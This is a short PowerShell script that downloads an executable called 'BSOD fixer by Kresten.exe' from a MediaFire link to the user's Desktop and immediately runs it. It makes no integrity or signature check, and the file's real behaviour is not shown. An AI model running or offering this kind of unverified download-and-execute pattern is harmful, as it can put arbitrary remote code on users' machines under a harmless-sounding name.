#The Download Script
$uri = "http://download942.mediafire.com/si2jo3sovczg/d76ppqzsc3spw8c/BSOD+fixer+by+Kresten.exe"
$out = "c:\Users\$env:UserName\Desktop\BSODFixer by Kresten.exe"
Invoke-WebRequest -Uri $uri -OutFile $out
& $out